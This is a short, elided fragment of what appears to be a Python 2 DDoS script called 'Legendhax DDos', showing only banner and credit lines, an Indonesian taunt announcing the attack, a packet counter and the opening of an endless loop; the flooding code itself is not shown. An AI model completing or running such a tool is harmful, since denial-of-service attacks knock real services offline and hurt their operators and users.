...
os.system("clear")
os.system("figlet Legendhax DDos")
print
print "Coded By : legendhax"
print "Author   : legendhax"
print "my friend Github   : github.com/gamkers"
...
time.sleep(5)
print "    DDOS ATTACK STARTED. NOTE: SIAP SIAP BUAT KEPALANYA HANCUR"
time.sleep(3)
sent = 0
while True:
